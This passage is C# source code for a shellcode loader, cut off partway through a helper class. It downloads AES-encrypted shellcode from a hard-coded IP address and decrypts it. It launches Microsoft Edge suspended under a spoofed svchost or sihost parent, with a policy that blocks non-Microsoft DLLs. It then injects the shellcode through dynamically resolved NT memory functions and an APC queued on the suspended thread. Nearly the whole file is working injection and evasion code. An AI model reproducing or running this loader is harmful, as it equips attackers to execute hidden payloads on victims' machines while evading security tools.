// Compile: csc /unsafe Program.cs
using System;
using System.Collections.Generic;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;
using System.Diagnostics;
using static DynamicInvoke.STRUCTS;
using static DynamicInvoke.DELEGATES;

namespace DynamicInvoke
{
	public static class Program
	{
		// Define target process properties: MS Edge
		public static string processToSpawn = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
		public static string processArgs = "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-startup-window --win-session-start /prefetch:5";
		public static string startDir = @"C:\\Program Files (x86)\\Microsoft\\Edge\\Application";

		public static void Main(string[] args)
		{
			byte[] encryptedData;

			using(var client = new WebClient())
			{
				client.Proxy = WebRequest.GetSystemWebProxy();
				client.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;

				// Set TLS versions
				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;
				encryptedData = client.DownloadData("http://192.168.65.128/encrypted.bin");
			}

			// Extract the key and the encrypted shellcode
			byte[] key = new byte[16];
			byte[] encryptedShellcode = new byte[encryptedData.Length - 16];
			Array.Copy(encryptedData, 0, key, 0, 16);
			Array.Copy(encryptedData, 16, encryptedShellcode, 0, encryptedData.Length - 16);

			byte[] decryptedShellcode = aesDecrypt(encryptedShellcode, key);

			IntPtr pointer;

			// Create the delegates references
			pointer = Invoke.GetLibraryAddress("kernel32.dll", "CreateProcessA");
			DELEGATES.CreateProcess CreateProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.CreateProcess)) as DELEGATES.CreateProcess;

			pointer = Invoke.GetLibraryAddress("kernel32.dll", "InitializeProcThreadAttributeList", false, true);
			DELEGATES.InitializeProcThreadAttributeList InitializeProcThreadAttributeList = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.InitializeProcThreadAttributeList)) as DELEGATES.InitializeProcThreadAttributeList;

			pointer = Invoke.GetLibraryAddress("kernel32.dll", "UpdateProcThreadAttribute", false, true);
			DELEGATES.UpdateProcThreadAttribute UpdateProcThreadAttribute = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.UpdateProcThreadAttribute)) as DELEGATES.UpdateProcThreadAttribute;

			pointer = Invoke.GetLibraryAddress("kernel32.dll", "DeleteProcThreadAttributeList", false, true);
			DELEGATES.DeleteProcThreadAttributeList DeleteProcThreadAttributeList = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.DeleteProcThreadAttributeList)) as DELEGATES.DeleteProcThreadAttributeList;

			pointer = Invoke.GetLibraryAddress("Ntdll.dll", "ZwQueryInformationProcess");
			DELEGATES.ZwQueryInformationProcess ZwQueryInformationProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.ZwQueryInformationProcess)) as DELEGATES.ZwQueryInformationProcess;

			pointer = Invoke.GetLibraryAddress("Ntdll.dll", "NtReadVirtualMemory");
			DELEGATES.NtReadVirtualMemory NtReadVirtualMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtReadVirtualMemory)) as DELEGATES.NtReadVirtualMemory;

			pointer = Invoke.GetLibraryAddress("Ntdll.dll", "NtProtectVirtualMemory");
			DELEGATES.NtProtectVirtualMemory NtProtectVirtualMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtProtectVirtualMemory)) as DELEGATES.NtProtectVirtualMemory;

			pointer = Invoke.GetLibraryAddress("kernel32.dll", "ResumeThread");
			DELEGATES.ResumeThread ResumeThread = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.ResumeThread)) as DELEGATES.ResumeThread;

			pointer = Invoke.GetLibraryAddress("Ntdll.dll", "NtWriteVirtualMemory");
			DELEGATES.NtWriteVirtualMemory NtWriteVirtualMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtWriteVirtualMemory)) as DELEGATES.NtWriteVirtualMemory;

			pointer = Invoke.GetLibraryAddress("Ntdll.dll", "NtAllocateVirtualMemory");
			DELEGATES.NtAllocateVirtualMemory NtAllocateVirtualMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtAllocateVirtualMemory)) as DELEGATES.NtAllocateVirtualMemory;

			pointer = Invoke.GetLibraryAddress("Ntdll.dll", "NtQueueApcThread");
			DELEGATES.NtQueueApcThread NtQueueApcThread = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtQueueApcThread)) as DELEGATES.NtQueueApcThread;

			STRUCTS.STARTUPINFOEX si = new STRUCTS.STARTUPINFOEX();
			STRUCTS.PROCESS_INFORMATION pi = new STRUCTS.PROCESS_INFORMATION();
			si.StartupInfo.cb = (uint) Marshal.SizeOf(si);
			var lpValue = Marshal.AllocHGlobal(IntPtr.Size);

			string successfulProcess = string.Empty;
			int successfulProcessPID = 0;
			try
			{
				STRUCTS.SECURITY_ATTRIBUTES lpa = new STRUCTS.SECURITY_ATTRIBUTES();
				STRUCTS.SECURITY_ATTRIBUTES lta = new STRUCTS.SECURITY_ATTRIBUTES();
				lpa.nLength = Marshal.SizeOf(lpa);
				lta.nLength = Marshal.SizeOf(lta);

				var lpSize = IntPtr.Zero;
				InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
				si.lpAttributeList = Marshal.AllocHGlobal(lpSize);
				InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, ref lpSize);

				Marshal.WriteIntPtr(lpValue, new IntPtr((long) 0x300000000000)); //BinarySignaturePolicy.BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE

				UpdateProcThreadAttribute(si.lpAttributeList, 0, (IntPtr) STRUCTS.ProcThreadAttribute.MITIGATION_POLICY, lpValue, (IntPtr) IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

				// Bruteforce the parent
				bool handleObtained = false;
				var parentHandle = IntPtr.Zero;

				string[] processes = {
					"svchost",
					"sihost"
				};
				foreach(string process in processes)
				{
					try
					{
						Console.WriteLine("[i] Trying to get a handle to: " + process);
						Process[] procList = Process.GetProcessesByName(process);

						foreach(Process proc in procList)
						{
							try
							{
								parentHandle = proc.Handle;
								handleObtained = true;
								Console.WriteLine($"[+] Successfully obtained handle: {process} (PID: {proc.Id})");
								successfulProcess = process;
								successfulProcessPID = proc.Id;
								break;
							}
							catch (Exception e)
							{
								Console.WriteLine($"\t[-] Error getting handle for {process} (PID: {proc.Id}): {e.Message}");
								continue;
							}
						}

						if (handleObtained)
						{
							break;
						}
					}
					catch (Exception e)
					{
						Console.WriteLine($"[-] Error getting processes for {process}: {e.Message}");
						continue;
					}
				}

				if (!handleObtained)
				{
					Console.WriteLine("[-] Error getting parent handle for any process. Exiting...");
					Environment.Exit(1);
				}

				lpValue = Marshal.AllocHGlobal(IntPtr.Size);
				Marshal.WriteIntPtr(lpValue, parentHandle);

				UpdateProcThreadAttribute(si.lpAttributeList, 0, (IntPtr) STRUCTS.ProcThreadAttribute.PARENT_PROCESS, lpValue, (IntPtr) IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

				CreateProcess(
					processToSpawn,
					processArgs,
					ref lpa,
					ref lta,
					false,
					STRUCTS.ProcessCreationFlags.CREATE_SUSPENDED | STRUCTS.ProcessCreationFlags.EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero,
					startDir,
					ref si,
					out pi
				);
			}
			catch (Exception error)
			{
				Console.Error.WriteLine("error" + error.StackTrace);
			}
			finally
			{
				DeleteProcThreadAttributeList(si.lpAttributeList);
				Marshal.FreeHGlobal(si.lpAttributeList);
				Marshal.FreeHGlobal(lpValue);
			}

			Console.WriteLine("[*] Spawned Target Process: {0}", processToSpawn);
			Console.WriteLine($"\t[*] Parent Process: {successfulProcess} (PID: {successfulProcessPID})");
			Console.WriteLine("\t[*] Process ID: {0}", pi.dwProcessId);

			// Allocate
			IntPtr BaseAddress = IntPtr.Zero;
			IntPtr regionBits = new IntPtr(Convert.ToUInt32(decryptedShellcode.Length));
			NtAllocateVirtualMemory(pi.hProcess, ref BaseAddress, IntPtr.Zero, ref regionBits, 0x1000, (uint) Protection.PAGE_READWRITE);

			// Write
			UInt32 bytesWritten = 0;
			var status = NtWriteVirtualMemory(pi.hProcess, BaseAddress, decryptedShellcode, (UInt32) decryptedShellcode.Length, ref bytesWritten);
			Console.WriteLine("\t[*] Written to Address: 0x{0}", BaseAddress.ToString("X"));

			// Change protection
			IntPtr regionSize = new IntPtr(decryptedShellcode.Length);
			uint oldProtect = 0;
			status = NtProtectVirtualMemory(pi.hProcess, ref BaseAddress, ref regionSize, (uint) Protection.PAGE_EXECUTE_READ, ref oldProtect);
			Console.WriteLine("\t[*] Protection changed to RX");

			// QueueUserAPC
			status = NtQueueApcThread(pi.hThread, BaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
			Console.WriteLine("[*] APC called");

			// Resume Thread
			ResumeThread(pi.hThread);
			Console.WriteLine("\t[*] Thread resumed, done.");
		}

		private static byte[] aesDecrypt(byte[] cipher, byte[] key)
		{
			byte[] IV = new byte[16]; // Initialization vector of 16 bytes set to 0x00

			using(AesManaged aes = new AesManaged())
			{
				aes.Padding = PaddingMode.PKCS7;
				aes.KeySize = 256;
				aes.Key = SHA256.Create().ComputeHash(key); // Derive the same key as in encryption
				aes.IV = IV;

				using(MemoryStream ms = new MemoryStream())
				{
					using(CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
					{
						cs.Write(cipher, 0, cipher.Length);
						cs.FlushFinalBlock(); // Ensure all data is written and padding is handled
					}

					return ms.ToArray();
				}
			}
		}
	}

	public class DELEGATES
	{
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate Boolean CreateProcess(string lpApplicationName, string lpCommandLine, ref STRUCTS.SECURITY_ATTRIBUTES lpProcessAttributes, ref STRUCTS.SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, STRUCTS.ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STRUCTS.STARTUPINFOEX lpStartupInfo, out STRUCTS.PROCESS_INFORMATION lpProcessInformation);

		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate UInt32 ZwQueryInformationProcess(IntPtr hProcess, Int32 procInformationClass, ref STRUCTS.PROCESS_BASIC_INFORMATION procInformation, UInt32 ProcInfoLen, ref UInt32 retlen);

		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate STRUCTS.NTSTATUS InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate STRUCTS.NTSTATUS UpdateProcThreadAttribute(IntPtr lpAttributeList, STRUCTS.ProcessCreationFlags dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate STRUCTS.NTSTATUS DeleteProcThreadAttributeList(IntPtr lpAttributeList);

		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate UInt32 NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewProtect, ref UInt32 OldProtect);

		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate UInt32 NtReadVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, Byte[] Buffer, UInt32 NumberOfBytesToRead, ref UInt32 NumberOfBytesRead);

		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate uint ResumeThread(IntPtr hThhread);

		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate UInt32 NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, Byte[] Buffer, UInt32 BufferLength, ref UInt32 BytesWritten);

		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate UInt32 NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect);

		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate UInt32 NtQueueApcThread(IntPtr ThreadHandle, IntPtr ApcRoutine, IntPtr ApcArgument1, IntPtr ApcArgument2, IntPtr ApcArgument3);

		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate UInt32 NtQueryInformationProcess(IntPtr processHandle, STRUCTS.PROCESSINFOCLASS processInformationClass, IntPtr processInformation, int processInformationLength, ref UInt32 returnLength);

		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate void RtlZeroMemory(IntPtr Destination, int length);
	}

	public class STRUCTS
	{
		[Flags]
		public enum ProcessCreationFlags: uint
		{
			CREATE_SUSPENDED = 0x00000004,
				EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
		}
		
		public struct PROCESS_INFORMATION
		{
			public IntPtr hProcess;
			public IntPtr hThread;
			public uint dwProcessId;
			public uint dwThreadId;
		}
		
		public struct PROCESS_BASIC_INFORMATION
		{
			public STRUCTS.NTSTATUS ExitStatus;
			public IntPtr PebBaseAddress;
			public UIntPtr AffinityMask;
			public int BasePriority;
			public UIntPtr UniqueProcessId;
			public UIntPtr InheritedFromUniqueProcessId;
		}
		
		public struct SECURITY_ATTRIBUTES
		{
			public int nLength;
			public IntPtr lpSecurityDescriptor;
			public int bInheritHandle;
		}
		
		public struct STARTUPINFO
		{
			public uint cb;
			public string lpReserved;
			public string lpDesktop;
			public string lpTitle;
			public uint dwX;
			public uint dwY;
			public uint dwXSize;
			public uint dwYSize;
			public uint dwXCountChars;
			public uint dwYCountChars;
			public uint dwFillAttribute;
			public uint dwFlags;
			public short wShowWindow;
			public short cbReserved2;
			public IntPtr lpReserved2;
			public IntPtr hStdInput;
			public IntPtr hStdOutput;
			public IntPtr hStdError;
		}
		
		public struct STARTUPINFOEX
		{
			public STARTUPINFO StartupInfo;
			public IntPtr lpAttributeList;
		}
		
		public enum ProcThreadAttribute: int
			{
				MITIGATION_POLICY = 0x20007,
					PARENT_PROCESS = 0x00020000
			}
			[StructLayout(LayoutKind.Sequential)]
		
		public struct UNICODE_STRING
		{
			public UInt16 Length;
			public UInt16 MaximumLength;
			public IntPtr Buffer;
		}

		public enum Protection: uint
		{
			PAGE_NOACCESS = 0x01,
				PAGE_READONLY = 0x02,
				PAGE_READWRITE = 0x04,
				PAGE_WRITECOPY = 0x08,
				PAGE_EXECUTE = 0x10,
				PAGE_EXECUTE_READ = 0x20,
				PAGE_EXECUTE_READWRITE = 0x40,
				PAGE_EXECUTE_WRITECOPY = 0x80,
				PAGE_GUARD = 0x100,
				PAGE_NOCACHE = 0x200,
				PAGE_WRITECOMBINE = 0x400
		}

		public enum NTSTATUS: uint
		{
			// Success
			Success = 0x00000000,
				Wait0 = 0x00000000,
				Wait1 = 0x00000001,
				Wait2 = 0x00000002,
				Wait3 = 0x00000003,
				Wait63 = 0x0000003f,
				Abandoned = 0x00000080,
				AbandonedWait0 = 0x00000080,
				AbandonedWait1 = 0x00000081,
				AbandonedWait2 = 0x00000082,
				AbandonedWait3 = 0x00000083,
				AbandonedWait63 = 0x000000bf,
				UserApc = 0x000000c0,
				KernelApc = 0x00000100,
				Alerted = 0x00000101,
				Timeout = 0x00000102,
				Pending = 0x00000103,
				Reparse = 0x00000104,
				MoreEntries = 0x00000105,
				NotAllAssigned = 0x00000106,
				SomeNotMapped = 0x00000107,
				OpLockBreakInProgress = 0x00000108,
				VolumeMounted = 0x00000109,
				RxActCommitted = 0x0000010a,
				NotifyCleanup = 0x0000010b,
				NotifyEnumDir = 0x0000010c,
				NoQuotasForAccount = 0x0000010d,
				PrimaryTransportConnectFailed = 0x0000010e,
				PageFaultTransition = 0x00000110,
				PageFaultDemandZero = 0x00000111,
				PageFaultCopyOnWrite = 0x00000112,
				PageFaultGuardPage = 0x00000113,
				PageFaultPagingFile = 0x00000114,
				CrashDump = 0x00000116,
				ReparseObject = 0x00000118,
				NothingToTerminate = 0x00000122,
				ProcessNotInJob = 0x00000123,
				ProcessInJob = 0x00000124,
				ProcessCloned = 0x00000129,
				FileLockedWithOnlyReaders = 0x0000012a,
				FileLockedWithWriters = 0x0000012b,
				// Informational
				Informational = 0x40000000,
				ObjectNameExists = 0x40000000,
				ThreadWasSuspended = 0x40000001,
				WorkingSetLimitRange = 0x40000002,
				ImageNotAtBase = 0x40000003,
				RegistryRecovered = 0x40000009,
				// Warning
				Warning = 0x80000000,
				GuardPageViolation = 0x80000001,
				DatatypeMisalignment = 0x80000002,
				Breakpoint = 0x80000003,
				SingleStep = 0x80000004,
				BufferOverflow = 0x80000005,
				NoMoreFiles = 0x80000006,
				HandlesClosed = 0x8000000a,
				PartialCopy = 0x8000000d,
				DeviceBusy = 0x80000011,
				InvalidEaName = 0x80000013,
				EaListInconsistent = 0x80000014,
				NoMoreEntries = 0x8000001a,
				LongJump = 0x80000026,
				DllMightBeInsecure = 0x8000002b,
				// Error
				Error = 0xc0000000,
				Unsuccessful = 0xc0000001,
				NotImplemented = 0xc0000002,
				InvalidInfoClass = 0xc0000003,
				InfoLengthMismatch = 0xc0000004,
				AccessViolation = 0xc0000005,
				InPageError = 0xc0000006,
				PagefileQuota = 0xc0000007,
				InvalidHandle = 0xc0000008,
				BadInitialStack = 0xc0000009,
				BadInitialPc = 0xc000000a,
				InvalidCid = 0xc000000b,
				TimerNotCanceled = 0xc000000c,
				InvalidParameter = 0xc000000d,
				NoSuchDevice = 0xc000000e,
				NoSuchFile = 0xc000000f,
				InvalidDeviceRequest = 0xc0000010,
				EndOfFile = 0xc0000011,
				WrongVolume = 0xc0000012,
				NoMediaInDevice = 0xc0000013,
				NoMemory = 0xc0000017,
				ConflictingAddresses = 0xc0000018,
				NotMappedView = 0xc0000019,
				UnableToFreeVm = 0xc000001a,
				UnableToDeleteSection = 0xc000001b,
				IllegalInstruction = 0xc000001d,
				AlreadyCommitted = 0xc0000021,
				AccessDenied = 0xc0000022,
				BufferTooSmall = 0xc0000023,
				ObjectTypeMismatch = 0xc0000024,
				NonContinuableException = 0xc0000025,
				BadStack = 0xc0000028,
				NotLocked = 0xc000002a,
				NotCommitted = 0xc000002d,
				InvalidParameterMix = 0xc0000030,
				ObjectNameInvalid = 0xc0000033,
				ObjectNameNotFound = 0xc0000034,
				ObjectNameCollision = 0xc0000035,
				ObjectPathInvalid = 0xc0000039,
				ObjectPathNotFound = 0xc000003a,
				ObjectPathSyntaxBad = 0xc000003b,
				DataOverrun = 0xc000003c,
				DataLate = 0xc000003d,
				DataError = 0xc000003e,
				CrcError = 0xc000003f,
				SectionTooBig = 0xc0000040,
				PortConnectionRefused = 0xc0000041,
				InvalidPortHandle = 0xc0000042,
				SharingViolation = 0xc0000043,
				QuotaExceeded = 0xc0000044,
				InvalidPageProtection = 0xc0000045,
				MutantNotOwned = 0xc0000046,
				SemaphoreLimitExceeded = 0xc0000047,
				PortAlreadySet = 0xc0000048,
				SectionNotImage = 0xc0000049,
				SuspendCountExceeded = 0xc000004a,
				ThreadIsTerminating = 0xc000004b,
				BadWorkingSetLimit = 0xc000004c,
				IncompatibleFileMap = 0xc000004d,
				SectionProtection = 0xc000004e,
				EasNotSupported = 0xc000004f,
				EaTooLarge = 0xc0000050,
				NonExistentEaEntry = 0xc0000051,
				NoEasOnFile = 0xc0000052,
				EaCorruptError = 0xc0000053,
				FileLockConflict = 0xc0000054,
				LockNotGranted = 0xc0000055,
				DeletePending = 0xc0000056,
				CtlFileNotSupported = 0xc0000057,
				UnknownRevision = 0xc0000058,
				RevisionMismatch = 0xc0000059,
				InvalidOwner = 0xc000005a,
				InvalidPrimaryGroup = 0xc000005b,
				NoImpersonationToken = 0xc000005c,
				CantDisableMandatory = 0xc000005d,
				NoLogonServers = 0xc000005e,
				NoSuchLogonSession = 0xc000005f,
				NoSuchPrivilege = 0xc0000060,
				PrivilegeNotHeld = 0xc0000061,
				InvalidAccountName = 0xc0000062,
				UserExists = 0xc0000063,
				NoSuchUser = 0xc0000064,
				GroupExists = 0xc0000065,
				NoSuchGroup = 0xc0000066,
				MemberInGroup = 0xc0000067,
				MemberNotInGroup = 0xc0000068,
				LastAdmin = 0xc0000069,
				WrongPassword = 0xc000006a,
				IllFormedPassword = 0xc000006b,
				PasswordRestriction = 0xc000006c,
				LogonFailure = 0xc000006d,
				AccountRestriction = 0xc000006e,
				InvalidLogonHours = 0xc000006f,
				InvalidWorkstation = 0xc0000070,
				PasswordExpired = 0xc0000071,
				AccountDisabled = 0xc0000072,
				NoneMapped = 0xc0000073,
				TooManyLuidsRequested = 0xc0000074,
				LuidsExhausted = 0xc0000075,
				InvalidSubAuthority = 0xc0000076,
				InvalidAcl = 0xc0000077,
				InvalidSid = 0xc0000078,
				InvalidSecurityDescr = 0xc0000079,
				ProcedureNotFound = 0xc000007a,
				InvalidImageFormat = 0xc000007b,
				NoToken = 0xc000007c,
				BadInheritanceAcl = 0xc000007d,
				RangeNotLocked = 0xc000007e,
				DiskFull = 0xc000007f,
				ServerDisabled = 0xc0000080,
				ServerNotDisabled = 0xc0000081,
				TooManyGuidsRequested = 0xc0000082,
				GuidsExhausted = 0xc0000083,
				InvalidIdAuthority = 0xc0000084,
				AgentsExhausted = 0xc0000085,
				InvalidVolumeLabel = 0xc0000086,
				SectionNotExtended = 0xc0000087,
				NotMappedData = 0xc0000088,
				ResourceDataNotFound = 0xc0000089,
				ResourceTypeNotFound = 0xc000008a,
				ResourceNameNotFound = 0xc000008b,
				ArrayBoundsExceeded = 0xc000008c,
				FloatDenormalOperand = 0xc000008d,
				FloatDivideByZero = 0xc000008e,
				FloatInexactResult = 0xc000008f,
				FloatInvalidOperation = 0xc0000090,
				FloatOverflow = 0xc0000091,
				FloatStackCheck = 0xc0000092,
				FloatUnderflow = 0xc0000093,
				IntegerDivideByZero = 0xc0000094,
				IntegerOverflow = 0xc0000095,
				PrivilegedInstruction = 0xc0000096,
				TooManyPagingFiles = 0xc0000097,
				FileInvalid = 0xc0000098,
				InsufficientResources = 0xc000009a,
				InstanceNotAvailable = 0xc00000ab,
				PipeNotAvailable = 0xc00000ac,
				InvalidPipeState = 0xc00000ad,
				PipeBusy = 0xc00000ae,
				IllegalFunction = 0xc00000af,
				PipeDisconnected = 0xc00000b0,
				PipeClosing = 0xc00000b1,
				PipeConnected = 0xc00000b2,
				PipeListening = 0xc00000b3,
				InvalidReadMode = 0xc00000b4,
				IoTimeout = 0xc00000b5,
				FileForcedClosed = 0xc00000b6,
				ProfilingNotStarted = 0xc00000b7,
				ProfilingNotStopped = 0xc00000b8,
				NotSameDevice = 0xc00000d4,
				FileRenamed = 0xc00000d5,
				CantWait = 0xc00000d8,
				PipeEmpty = 0xc00000d9,
				CantTerminateSelf = 0xc00000db,
				InternalError = 0xc00000e5,
				InvalidParameter1 = 0xc00000ef,
				InvalidParameter2 = 0xc00000f0,
				InvalidParameter3 = 0xc00000f1,
				InvalidParameter4 = 0xc00000f2,
				InvalidParameter5 = 0xc00000f3,
				InvalidParameter6 = 0xc00000f4,
				InvalidParameter7 = 0xc00000f5,
				InvalidParameter8 = 0xc00000f6,
				InvalidParameter9 = 0xc00000f7,
				InvalidParameter10 = 0xc00000f8,
				InvalidParameter11 = 0xc00000f9,
				InvalidParameter12 = 0xc00000fa,
				ProcessIsTerminating = 0xc000010a,
				MappedFileSizeZero = 0xc000011e,
				TooManyOpenedFiles = 0xc000011f,
				Cancelled = 0xc0000120,
				CannotDelete = 0xc0000121,
				InvalidComputerName = 0xc0000122,
				FileDeleted = 0xc0000123,
				SpecialAccount = 0xc0000124,
				SpecialGroup = 0xc0000125,
				SpecialUser = 0xc0000126,
				MembersPrimaryGroup = 0xc0000127,
				FileClosed = 0xc0000128,
				TooManyThreads = 0xc0000129,
				ThreadNotInProcess = 0xc000012a,
				TokenAlreadyInUse = 0xc000012b,
				PagefileQuotaExceeded = 0xc000012c,
				CommitmentLimit = 0xc000012d,
				InvalidImageLeFormat = 0xc000012e,
				InvalidImageNotMz = 0xc000012f,
				InvalidImageProtect = 0xc0000130,
				InvalidImageWin16 = 0xc0000131,
				LogonServer = 0xc0000132,
				DifferenceAtDc = 0xc0000133,
				SynchronizationRequired = 0xc0000134,
				DllNotFound = 0xc0000135,
				IoPrivilegeFailed = 0xc0000137,
				OrdinalNotFound = 0xc0000138,
				EntryPointNotFound = 0xc0000139,
				ControlCExit = 0xc000013a,
				InvalidAddress = 0xc0000141,
				PortNotSet = 0xc0000353,
				DebuggerInactive = 0xc0000354,
				CallbackBypass = 0xc0000503,
				PortClosed = 0xc0000700,
				MessageLost = 0xc0000701,
				InvalidMessage = 0xc0000702,
				RequestCanceled = 0xc0000703,
				RecursiveDispatch = 0xc0000704,
				LpcReceiveBufferExpected = 0xc0000705,
				LpcInvalidConnectionUsage = 0xc0000706,
				LpcRequestsNotAllowed = 0xc0000707,
				ResourceInUse = 0xc0000708,
				ProcessIsProtected = 0xc0000712,
				VolumeDirty = 0xc0000806,
				FileCheckedOut = 0xc0000901,
				CheckOutRequired = 0xc0000902,
				BadFileType = 0xc0000903,
				FileTooLarge = 0xc0000904,
				FormsAuthRequired = 0xc0000905,
				VirusInfected = 0xc0000906,
				VirusDeleted = 0xc0000907,
				TransactionalConflict = 0xc0190001,
				InvalidTransaction = 0xc0190002,
				TransactionNotActive = 0xc0190003,
				TmInitializationFailed = 0xc0190004,
				RmNotActive = 0xc0190005,
				RmMetadataCorrupt = 0xc0190006,
				TransactionNotJoined = 0xc0190007,
				DirectoryNotRm = 0xc0190008,
				CouldNotResizeLog = 0xc0190009,
				TransactionsUnsupportedRemote = 0xc019000a,
				LogResizeInvalidSize = 0xc019000b,
				RemoteFileVersionMismatch = 0xc019000c,
				CrmProtocolAlreadyExists = 0xc019000f,
				TransactionPropagationFailed = 0xc0190010,
				CrmProtocolNotFound = 0xc0190011,
				TransactionSuperiorExists = 0xc0190012,
				TransactionRequestNotValid = 0xc0190013,
				TransactionNotRequested = 0xc0190014,
				TransactionAlreadyAborted = 0xc0190015,
				TransactionAlreadyCommitted = 0xc0190016,
				TransactionInvalidMarshallBuffer = 0xc0190017,
				CurrentTransactionNotValid = 0xc0190018,
				LogGrowthFailed = 0xc0190019,
				ObjectNoLongerExists = 0xc0190021,
				StreamMiniversionNotFound = 0xc0190022,
				StreamMiniversionNotValid = 0xc0190023,
				MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
				CantOpenMiniversionWithModifyIntent = 0xc0190025,
				CantCreateMoreStreamMiniversions = 0xc0190026,
				HandleNoLongerValid = 0xc0190028,
				NoTxfMetadata = 0xc0190029,
				LogCorruptionDetected = 0xc0190030,
				CantRecoverWithHandleOpen = 0xc0190031,
				RmDisconnected = 0xc0190032,
				EnlistmentNotSuperior = 0xc0190033,
				RecoveryNotNeeded = 0xc0190034,
				RmAlreadyStarted = 0xc0190035,
				FileIdentityNotPersistent = 0xc0190036,
				CantBreakTransactionalDependency = 0xc0190037,
				CantCrossRmBoundary = 0xc0190038,
				TxfDirNotEmpty = 0xc0190039,
				IndoubtTransactionsExist = 0xc019003a,
				TmVolatile = 0xc019003b,
				RollbackTimerExpired = 0xc019003c,
				TxfAttributeCorrupt = 0xc019003d,
				EfsNotAllowedInTransaction = 0xc019003e,
				TransactionalOpenNotAllowed = 0xc019003f,
				TransactedMappingUnsupportedRemote = 0xc0190040,
				TxfMetadataAlreadyPresent = 0xc0190041,
				TransactionScopeCallbacksNotSet = 0xc0190042,
				TransactionRequiredPromotion = 0xc0190043,
				CannotExecuteFileInTransaction = 0xc0190044,
				TransactionsNotFrozen = 0xc0190045,
				MaximumNtStatus = 0xffffffff
		}
		public struct LIST_ENTRY
		{
			public IntPtr Flink;
			public IntPtr Blink;
		}
		[StructLayout(LayoutKind.Sequential)]
		public struct LDR_DATA_TABLE_ENTRY
		{
			public LIST_ENTRY InLoadOrderLinks;
			public LIST_ENTRY InMemoryOrderLinks;
			public LIST_ENTRY InInitializationOrderLinks;
			public IntPtr DllBase;
			public IntPtr EntryPoint;
			public UInt32 SizeOfImage;
			public UNICODE_STRING FullDllName;
			public UNICODE_STRING BaseDllName;
		}
		[StructLayout(LayoutKind.Explicit)]
		public struct ApiSetNamespace
		{
			[FieldOffset(0x0C)]
			public int Count;
			[FieldOffset(0x10)]
			public int EntryOffset;
		}
		[StructLayout(LayoutKind.Explicit, Size = 24)]
		public struct ApiSetNamespaceEntry
		{
			[FieldOffset(0x04)]
			public int NameOffset;
			[FieldOffset(0x08)]
			public int NameLength;
			[FieldOffset(0x10)]
			public int ValueOffset;
			[FieldOffset(0x14)]
			public int ValueLength;
		}

		[StructLayout(LayoutKind.Explicit)]
		public struct ApiSetValueEntry
		{
			[FieldOffset(0x00)]
			public int Flags;
			[FieldOffset(0x04)]
			public int NameOffset;
			[FieldOffset(0x08)]
			public int NameCount;
			[FieldOffset(0x0C)]
			public int ValueOffset;
			[FieldOffset(0x10)]
			public int ValueCount;
		}
		public enum PROCESSINFOCLASS: int
		{
			ProcessBasicInformation = 0, // 0, q: PROCESS_BASIC_INFORMATION, PROCESS_EXTENDED_BASIC_INFORMATION
				ProcessWow64Information, // q: ULONG_PTR
		};
	}
	public class Invoke
	{
		public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters)
		{
			IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName);
			return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);
		}
		
